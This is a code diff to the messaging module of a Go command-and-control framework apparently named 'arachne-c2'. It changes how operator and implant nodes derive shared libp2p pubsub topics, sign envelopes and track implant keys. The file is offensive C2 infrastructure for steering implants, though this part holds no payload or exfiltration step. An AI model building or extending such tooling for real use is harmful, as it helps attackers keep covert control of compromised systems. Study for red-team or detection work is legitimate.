@@ -9,44 +9,44 @@ import (
 	"google.golang.org/protobuf/proto"
 
 	"github.com/libp2p/go-libp2p/core/crypto"
+	"github.com/libp2p/go-libp2p/core/peer"
 
-	arachnepb "github.com/anomalyco/arachne-c2/protobuf/arachnepb"
-	"github.com/anomalyco/arachne-c2/pkg/cryptography"
+	arachnepb "github.com/portbuster1337/arachne-c2/protobuf/arachnepb"
+	"github.com/portbuster1337/arachne-c2/pkg/cryptography"
 )
 
-// ErrSignatureInvalid is returned when envelope signature verification fails.
 var ErrSignatureInvalid = fmt.Errorf("signature invalid")
 
-type MessageHandler func(ctx context.Context, envelope *arachnepb.Envelope, fromPubKey crypto.PubKey)
+type MessageHandler func(ctx context.Context, envelope *arachnepb.Envelope, senderPub crypto.PubKey)
 
 type Messenger struct {
-	node    *Node
-	handler MessageHandler
-	privKey crypto.PrivKey
-
-	// Trusted public key for verifying inbound messages.
-	// Operator side: set after first verified registration per implant.
-	// Implant side: set at startup (operator's public key embedded in binary).
+	node          *Node
+	handler       MessageHandler
+	privKey       crypto.PrivKey
+	operatorID    peer.ID
 	trustedPubKey crypto.PubKey
-
-	// Known implant public keys (operator side, keyed by peer ID string).
 	knownImplants map[string]crypto.PubKey
-
-	mu sync.RWMutex
+	mu            sync.RWMutex
 }
 
 func NewOperatorMessenger(ctx context.Context, node *Node, keys *cryptography.OperatorKey) *Messenger {
 	return &Messenger{
 		node:          node,
 		privKey:       keys.PrivateKey,
+		operatorID:    node.ID(),
 		knownImplants: make(map[string]crypto.PubKey),
 	}
 }
 
 func NewImplantMessenger(ctx context.Context, node *Node, keys *cryptography.ImplantKey, operatorPub crypto.PubKey) *Messenger {
+	opID, err := peer.IDFromPublicKey(operatorPub)
+	if err != nil {
+		opID = peer.ID("")
+	}
 	return &Messenger{
 		node:          node,
 		privKey:       keys.PrivateKey,
+		operatorID:    opID,
 		trustedPubKey: operatorPub,
 		knownImplants: make(map[string]crypto.PubKey),
 	}
@@ -56,12 +56,6 @@ func (m *Messenger) SetHandler(handler MessageHandler) {
 	m.mu.Lock()
 	defer m.mu.Unlock()
 	m.handler = handler
-}
-
-func (m *Messenger) SetTrustedPubKey(pub crypto.PubKey) {
-	m.mu.Lock()
-	defer m.mu.Unlock()
-	m.trustedPubKey = pub
 }
 
 func (m *Messenger) AddKnownImplant(peerID string, pub crypto.PubKey) {
@@ -76,20 +70,23 @@ func (m *Messenger) KnownImplant(peerID string) crypto.PubKey {
 	return m.knownImplants[peerID]
 }
 
+// CommandTopic returns the topic where operators publish commands.
+// Both sides derive this from the operator's PeerID.
 func (m *Messenger) CommandTopic() string {
-	return CommandTopicPrefix + m.node.ID().String()
+	return CommandTopicPrefix + m.operatorID.String()
 }
 
+// BeaconTopic returns the topic where implants publish beacons.
+// Both sides derive this from the operator's PeerID.
 func (m *Messenger) BeaconTopic() string {
-	return BeaconTopicPrefix + m.node.ID().String()
+	return BeaconTopicPrefix + m.operatorID.String()
 }
 
+// TaskTopic returns a per-implant topic for targeted commands.
 func (m *Messenger) TaskTopic(implantPeerID string) string {
 	return TaskTopicPrefix + implantPeerID
 }
 
-// VerifyEnvelope checks the signature on an envelope against the provided public key.
-// Returns the parsed public key on success.
 func VerifyEnvelope(env *arachnepb.Envelope, trustedPub crypto.PubKey) error {
 	if trustedPub == nil {
 		return fmt.Errorf("no trusted public key configured")
@@ -107,7 +104,6 @@ func VerifyEnvelope(env *arachnepb.Envelope, trustedPub crypto.PubKey) error {
 	return nil
 }
 
-// PubKeyFromEnvelope extracts the sender's public key from the envelope's SenderKey field.
 func PubKeyFromEnvelope(env *arachnepb.Envelope) (crypto.PubKey, error) {
 	if len(env.SenderKey) == 0 {
 		return nil, fmt.Errorf("no sender key in envelope")
@@ -115,8 +111,6 @@ func PubKeyFromEnvelope(env *arachnepb.Envelope) (crypto.PubKey, error) {
 	return cryptography.PubKeyFromBytes(env.SenderKey)
 }
 
-// ListenVerified subscribes to a topic and only delivers messages whose signatures
-// verify against the trusted public key.
 func (m *Messenger) listenVerified(ctx context.Context, topic string, getTrusted func() crypto.PubKey) error {
 	sub, err := m.node.Subscribe(topic)
 	if err != nil {
@@ -135,8 +129,6 @@ func (m *Messenger) listenVerified(ctx context.Context, topic string, getTrusted
 
 			trusted := getTrusted()
 			if trusted == nil {
-				// Before we know the implant's key (first registration), we
-				// accept the envelope and let the handler validate identity.
 				m.deliver(ctx, env)
 				continue
 			}
@@ -152,8 +144,6 @@ func (m *Messenger) listenVerified(ctx context.Context, topic string, getTrusted
 
 func (m *Messenger) ListenBeacons(ctx context.Context) error {
 	return m.listenVerified(ctx, m.BeaconTopic(), func() crypto.PubKey {
-		// The operator may have 0-to-many implants, each with its own key.
-		// Verification is done per-implant in the handler, not globally.
 		return nil
 	})
 }
@@ -188,18 +178,17 @@ func (m *Messenger) SendEnvelope(ctx context.Context, topic string, env *arachne
 	return m.node.Publish(ctx, topic, data)
 }
 
-// SignAndSend signs the envelope data, attaches signature + sender key, then publishes.
 func (m *Messenger) SignAndSend(ctx context.Context, topic string, env *arachnepb.Envelope) error {
 	if m.privKey == nil {
 		return fmt.Errorf("no private key for signing")
 	}
-	sig, err := cryptography.Sign(m.privKey, env.Data)
+	sig, err := m.privKey.Sign(env.Data)
 	if err != nil {
 		return fmt.Errorf("sign: %w", err)
 	}
 	env.Signature = sig
 
-	pubBytes, err := m.privKey.GetPublic().Raw()
+	pubBytes, err := crypto.MarshalPublicKey(m.privKey.GetPublic())
 	if err == nil {
 		env.SenderKey = pubBytes
 	}
@@ -212,4 +201,8 @@ func (m *Messenger) CreateEnvelope(msgType uint32, data []byte) *arachnepb.Envel
 		Type: msgType,
 		Data: data,
 	}
+}
+
+func (m *Messenger) RendezvousString() string {
+	return "arachne/" + m.operatorID.String()
 }
